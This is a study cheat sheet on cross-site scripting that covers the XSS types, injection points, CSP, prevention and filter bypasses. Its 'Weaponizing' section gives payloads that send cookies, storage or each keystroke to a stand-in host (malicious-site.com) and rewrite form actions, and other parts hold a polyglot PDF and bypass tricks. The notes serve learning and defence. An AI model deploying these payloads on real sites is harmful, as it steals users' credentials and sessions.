<!--
 * This file is part of RS Cheat Sheets.
 *
 * RS Cheat Sheets is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * RS Cheat Sheets is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with RS Cheat Sheets. If not, see <https://www.gnu.org/licenses/>.
 */
-->

[Home](../README.md)

# Cross Site Scripting(XSS)
Cross site scripting(XSS) allows an attacker to get a victim to run malicious code on their browser while looking like it came from a legitimate source.

There are 2 type of XSS attacks.
- Through URL parameters
	- When a victim is sent a malicious URL, they may click on it because the base domain comes from a legitimate source.
		- **Reflected XSS**: Server uses the URL parameter to change the DOM.
		- **DOM-Based XSS**: Client uses the URL parameter to change the DOM.
- Through the database
	- **Stored XSS**: When the victim comes across malicious data stored in the database, that malicious data gets ran on their browser.
		- Ex: Posting a comment which other users can see.

## Todo
- Content Security Policy(CSP)s
- Cross origin resource sharing(CORS)
- HTML encoding(Ex: change `<`s to `&lt;`) vs HTML sanitization(Allowing some html elements, but not all)
- Javascript sinks
- CSS injection
- XSS through PDFs
- XSS through SVGs
- XSS through XML
- Why double url encode?
- Polygots
	- Messy set of characters to find if something is breaks out
	- String that's designed to execute in multiple different environments
	- Headless browser for DOM based XSS
		- Use console.log XSS attacks and see if any pop up
		- Can't use burp because it's on the client

```
%PDF-1.4
%Ã¤Ã¼Ã¶Ã
2 0 obj
<</Length 3 0 R/Filter/FlateDecode>>
stream
x=Ë
1E÷ù»v¶é´0è~ àø
R
R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
```

- Is there a way to do a URI based XSS when the link has `?` in front?
	- I was getting this reflected in the DOM: `<a href="?myinput&page=2">`
	- I tried: `<a href="?javascript:alert();//&page=2">`, but that didn't work
	- I don't know if it's possible to escape the `?` that's in front
	- I couldn't escape the attribute with `"`s because it was being URL encoded
	- https://www.rei.com/events/search?

## Need to research
- __proto__
- constructor
- prototype
- document.cookies for XSS
- non-HTML-based sinks? Like setTimeout. What does that mean?
- Dangling markup injections?

- Compensating controls
	- Prevent weaponization of XSS
		1. Cookie flags
		2. Browser security headers
		3. Content Security Policy(CSP)
	- Prevent attack in the first place
		4. Web Application Firewall(WAF)
			- Can create a false sense of security
			- Usually prevent the site from loading at all and gives error page
		5. Client-Side Validation
		6. Server-Side Validation
		7. Output Encoding

<!-- TOC -->

- [Cross Site ScriptingXSS](#cross-site-scriptingxss)
	- [Todo](#todo)
	- [Need to research](#need-to-research)
	- [URL parameter XSS](#url-parameter-xss)
	- [Common payloads](#common-payloads)
	- [Different types of Sinks - Where user input is used](#different-types-of-sinks---where-user-input-is-used)
		- [Inside html elements](#inside-html-elements)
		- [Inside html attributes](#inside-html-attributes)
			- [Uniform Resource IdentifierURIs](#uniform-resource-identifieruris)
		- [Inside JavascriptClient side javascript inject](#inside-javascriptclient-side-javascript-inject)
		- [Inside CSS](#inside-css)
		- [Inside JSON](#inside-json)
	- [Easy ways to prevent XSS](#easy-ways-to-prevent-xss)
		- [Content Security Policies CSPs](#content-security-policies-csps)
	- [Bypassing common XSS filters](#bypassing-common-xss-filters)
	- [Weaponizing XSS payloads](#weaponizing-xss-payloads)
		- [Stealing information](#stealing-information)
			- [Key logger](#key-logger)
		- [What information to steal](#what-information-to-steal)
		- [Manipulating actions](#manipulating-actions)
	- [HTML encodingsearch and replace vs HTML sanitizationAllowing some elements](#html-encodingsearch-and-replace-vs-html-sanitizationallowing-some-elements)
	- [File upload vulnerabilities](#file-upload-vulnerabilities)
	- [Reference table](#reference-table)

<!-- /TOC -->

## URL parameter XSS
- The URL parameter have to be used somewhere within the DOM.
	- They may not visually show up, but they may still be used. Ex: Hidden inputs

```javascript
The URL
	https://insecure-website.com/?parameter=<script>print()</script>
Possible html output
	<p><script>print()</script></p>
```

- Forms often use URL parameters to pass information
- Fragment identifiers(`#`s in the URL) can be used by the client to change the DOM.

## Common payloads
- `<script>print()</script>`
- `<img src onerror=print()>`
- `<a href="javascript:print()">`

[Payload list](https://github.com/payloadbox/xss-payload-list)

- Common payload content
- `print()`
- `alert()`
- `confirm()`
- `prompt()`
- `console.log()`

## Different types of Sinks - Where user input is used

### Inside html elements
- Ex: `<p>{userInput}</p>`

In order to prevent this the server should filter out any `<`s
- Ex: `userInput = userInput.replaceAll("<", "&lt;")`
- This works because no html entity can start without a `<`

### Inside html attributes
- Ex: `<a src="{user input}">Link</a>`
- Ex2: `<input value="{user input}">`

In order to perform an XSS attack you can either use URIs or escape the attribute with `"`, `'`, or `s

In order to prevent this the server should filter out any `<`s and `"`s as well as have a whitelist of URIs
- Ex: `userInput = userInput.replaceAll("<", "&lt;").replaceAll('"', "&quot;")`
- This works because no html entity can start without a `<`

#### Uniform Resource Identifier(URIs)
- URIs are often used for attributes which can access the internet
	- `src`, `href`, `action`, `data`, `formaction`, `poster`, `manifest`, `ping`, `cite`, `usemap`
- URIs can also be used for many event based attributes
	- Ex: `<button onclick="javascript:alert()">`
- URIs cannot be used for `<input value="{user input}">`
- URIs
	- `javascript:print()`
	- Doesn't work on modern browsers
		- `data:[<mediatype>][;base64],<data>`
			- `data:image/svg+xml;utf8,<svg content>`
			- `data:text/html;base64,PHNjcmlwdD5wcmludCgpPC9zY3JpcHQ+`
			- `data:text/html,<script>print()</script>`
		- `vbscript:MsgBox('XSS')` or `vbscript:msgbox('XSS')`
		- `livescript:[code]`

In order to prevent URI attacks there should be a whitelist of acceptable URIs and not a blacklist.
- Why not use a Blacklist
	- There are lots of non-standard URIs for different browser
	- There could be more unsafe URIs in the future
	- There can be unique ways of encoding URIs
		- Ex: `jAvAsCrIpT:`, `javas%09cript:`, `javas]]<![CDATA[cript:`, `javascript:javascript:`
			- `%09`, `%00`, `%20`, `%10`, or `\0`
			- `?javascript:` does not work
- Common whitelist used by Wordpress
	- `http`, `https`, `ftp`, `ftps`, `mailto`, `news`, `irc`, `gopher`, `nntp`, `feed`, `telnet`, `mms`, `rtsp`, `svn`, `tel`, `fax`, `xmpp`

```javascript
	let uriWhitelist = ["http://", "https://"]
	let validUserInput = false
	for(const uri of uriWhitelist){
		if(userInput.startsWith(uri)){
			validUserInput = true
			break
		}
	}
```

### Inside Javascript(Client side javascript inject)
- Ex:

How do you find these?
	- Searching in the js code takes a while
		- Does Burp's DOM Injection find all of them?

```javascript
const params = new URLSearchParams(window.location.search)
const param1 = params.get('param1')
const param2 = params.get('param2')
```

- May need escaping
- Common js code to get URL parameters and fragment identifies(`#`)
	- `document.URL`, `document.documentURI`, `document.baseURI`
	- Location(these are all the same obj): `window.location`, `document.location`, `location`
	- JQuery: `.parseParams()`
- Sinks
	- innerHTML
		- Doesn't work with script tag
		- Use img or iframe
		- Written to the page after all the js is loaded and ran, therefore script tags won't work
	- eval(input)

	Avoid using `element.innerHTML = userInput;` and instead use `element.innerText = userInput;`
		- This doesn't work if the element is a script?

### Inside CSS
	- Not very common

### Inside JSON
	- Have to escape the "s
	- Inject another key and value
	- Can you also execute javascript of html?

## Easy ways to prevent XSS
- Pass information through the body instead of through URL parameters
- Be very cautious when using react's `dangerouslySetInnerHTML`
- Follow the common prevention techniques for the different sinks
	- Use `<input value="userInput">` to prevent URI attacks(Still need to search and replace).
- Use whitelists and/or blacklists for allowable data
- Use Content Security Policy

### Content Security Policies (CSPs)
- Content Security Policies are a browser/client protection which allows the server to specify which sources can be used for 
	- It can be used to mitigate XSS attacks.
- CSPs are set by the server through a response header

- Doesn't block HTML injection?
- Used to create a whitelist on allowed sources for each content?

- Can't use CSPs for inline JS code because it can't be distinguished from user injected js code.
	- All CSS and JS have to be included with the `<script src="">` or `<link href="">`
	- You can mark code that is inline by using the `nonce` attribute
		- The server usually takes a hash of the code with a secret password and uses that as the nonce

```javascript
// On the server
let jsCode = `
	console.log("Testing nonce")
`

<script
	nonce={hash(jsCode, password)}
	dangerouslySetInnerHTML={{__html: jsCode}}
></script>
```

```
Content-Security-Policy: script-src 'self'; report-uri 'capture-data.php';
[        Header        ][   Name  ][Source][   Name  ][     Source       ]
                        [    Directive    ][          Directive          ]
                        [                     Value                      ]
```

	What are directives?
- Directives - Separated by `;`s
	- Resource "fetch" policies - Specifies trusted locations for source code and other resources
	- Document policies
	- Navigation policies - Decide where the user can be sent and who can frame the site
	- Reporting policies - Allows violations to be reported to the dev team
	- Other

	What are names?
- Names - Specifies which resource is being whitelisted. One per directive.
	- script-src
	- style-src
	- default-src
	- img-src
	- connect-src
	- form-action
	- font-src
	- frame-src

- Different types of Sources:

- Directives
	- Name value pairs which are space delimited
	- Blockers

- script-src 'self' https://www.example.com;
	- Scripts can be downloaded from self and https://www.example.com

- Names
- Example sources
	- none - Disables any resources
	- self - The same domain
	- URL - Another domain
	- Usually used for legacy code
		- Nonce - A random number assigned to the script by the server. Changes upon each refresh.
		- Digest - A hash of the code included in the page. Doesn't change on refresh.

- script-src
- 'self';
- report-uri
- 'capture-data.php';

- Can you set multiple nonces in the CSP header?
	- Do you have one nonce for all the inline script files?
	- How would that prevent DOM based XSS?


- Sets of Headers in every response which tell the browser what resources are allowed or disabled.

- CSPs help to midigate the damage done from refelced or stored XSS?

- How can CSPs prevent DOM based XSS?

- Sent by server in the header in every response
- Allows us to specify exactly what sources are trusted and disable any inline resources
- Can distinguish between legitimate inputs and injected JS code

	- https://web.dev/articles/csp
	- Content-Security-Policy-Report-Only:

## Bypassing common XSS filters
- Trying the same character multiple times(replace vs replaceAll)
- Avoiding commonly used XSS attacks
	- Try something other than
		- `alert()`
		- `<script>`
		- `javascript:`
- Avoid using `()`s
	- alert\`\`, print\`\`, confirm\`\`

- Filtering out tags
	- Test all the tag
- Filter out events
	- Test all the events
- Filtering out special characters
	- Test alternatives to special character

See [XXS Tests](./xss_tests.md)

- It is often times worth try to double URL encode you input.
	- Why?

- Try to avoid attack vectors where everyone will try XSS
	- The 1st search box on the home page

## Weaponizing XSS payloads

### Stealing information
- Redirect site to malicious site: `window.location='https://malicious-site.com?info=' + info`
- Send data to malicious site without redirect: `
- Mouse hover over element: `<a href="https://www.youtube.com/" onmouseover="window.location='https://malicious-site.com?info=' + info">Youtube</a>`
	- This could be blocked by Content Security Policy

#### Key logger
- Can't use `fetch` because it's blocked by CORS

```javascript
document.addEventListener('keydown', (event) => {
    const script = document.createElement('script');
    script.src = 'http://malicious-site.com/?key=' + encodeURIComponent(event.key);
    document.body.appendChild(script);
});
```

### What information to steal
- Cookies: `escape(document.cookie)`
	- `escape` URL encodes the cookie so it can be sent through the URL
- Storage: `escape(JSON.stringify(localStorage))` or `escape(JSON.stringify(sessionStorage))`

### Manipulating actions
- Wait for elements to load: `<script>window.onload=function(){`
	- Making a comment: `document.getElementByName('comment')[0].innerHTML='Comment';document.getElementById('theform').submit();`
	- Changing action(where info is sent) of a form: `document.getElementById('theform').action='https://malicious-site.com'`
- `}</script>`


## HTML encoding(search and replace) vs HTML sanitization(Allowing some elements)
- **HTML encoding** - Search and replace key characters to prevent XSS
- **HTML Sanitization** - Some user input need to allow certain HTML elements.
	- It can be very difficult to prevent XSS attacks. Often whitelists are used to prevent malicious HTML elements, but this may not be set up correctly.
	- Ex: Stylized emails with HTML and CSS

## File upload vulnerabilities
- SVGs
- PDFs

## Reference table

- Same number as URL(Hex)
	- HTML hex
		- Ex: `&#x22;`
	- JS Unicode
		- Ex: `\u0022`
	- JS Hex
		- Ex: `\x22`

| Symbol | HTML name | HTML code | URL   |
|--------|-----------|-----------|-------|
| `%`    |           | `&#37;`   | `%25` |
| `"`    | `&quot;`  | `&#34;`   | `%22` |
| `&`    | `&amp;`   | `&#38;`   | `%26` |
| `'`    | `&apos;`  | `&#39;`   | `%27` |
| `<`    | `&lt;`    | `&#60;`   | `%3C` |
| `>`    | `&gt;`    | `&#62;`   | `%3E` |
| `\`    |           | `&#92;`   | `%5C` |
| `#`    |           | `&#35;`   | `%23` |
| `?`    |           | `&#63;`   | `%3F` |